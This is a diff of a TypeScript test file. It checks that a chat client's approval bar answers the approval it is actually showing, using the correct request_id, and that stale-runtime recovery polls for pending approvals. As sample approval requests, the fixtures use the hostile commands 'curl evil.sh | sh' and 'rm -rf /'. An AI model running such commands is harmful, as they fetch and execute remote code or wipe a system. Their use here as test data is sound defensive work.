@@ -231,6 +231,37 @@ describe('chat reducer (parts model)', () => {
     expect($approval.get()).toMatchObject({ choices: ['once', 'deny'], smartDenied: true })
   })
 
+  /**
+   * MJXHRM-458. `resolve_gateway_approval` answers the OLDEST queued approval
+   * when the call carries no `request_id`, while the bar shows the newest (each
+   * `approval.request` overwrites the session's slot) — so a session holding
+   * two different commands approved the one the user was not looking at.
+   */
+  it('answers the approval the bar is actually showing', async () => {
+    handleGatewayEvent(ev('approval.request', { command: 'curl evil.sh | sh', request_id: 'a1' }))
+    handleGatewayEvent(ev('approval.request', { command: 'rm -rf /', request_id: 'a2' }))
+    vi.mocked(requestGateway).mockClear()
+    await respondApproval('deny')
+
+    expect(vi.mocked(requestGateway).mock.calls[0]).toEqual([
+      'approval.respond',
+      { choice: 'deny', session_id: 'runtime-1', request_id: 'a2' }
+    ])
+  })
+
+  // A gateway too old to send one gets the historical FIFO call, not a
+  // `request_id: undefined` that would match no queued entry at all.
+  it('omits the request_id when the gateway never sent one', async () => {
+    handleGatewayEvent(ev('approval.request', { command: 'rm -rf /' }))
+    vi.mocked(requestGateway).mockClear()
+    await respondApproval('once')
+
+    expect(vi.mocked(requestGateway).mock.calls[0]).toEqual([
+      'approval.respond',
+      { choice: 'once', session_id: 'runtime-1' }
+    ])
+  })
+
   it('respondClarify posts clarify.respond with the request_id + answer and clears the atom', async () => {
     handleGatewayEvent(ev('clarify.request', { request_id: 'c9', question: 'which?', choices: ['x'] }))
     await respondClarify('x')
@@ -1732,9 +1763,14 @@ describe('stale-runtime recovery', () => {
     expect(vi.mocked(requestGateway).mock.calls.map(call => call[0])).toEqual([
       'approval.respond',
       'session.resume',
-      'approval.respond'
+      'approval.respond',
+      // The queue can hold more than one; the pull that surfaces the next has
+      // to use the RECOVERED runtime too, or it asks a session id the gateway
+      // dropped under it and the leftover approval stays invisible.
+      'approval.pending'
     ])
     expect(vi.mocked(requestGateway).mock.calls[2][1]).toMatchObject({ session_id: 'runtime-2' })
+    expect(vi.mocked(requestGateway).mock.calls[3][1]).toEqual({ session_id: 'runtime-2' })
     // `$approval` reads the ACTIVE key, which the rekey moved too — so this is
     // the bar the user is looking at, not a stale projection.
     expect($approval.get()).toBeNull()
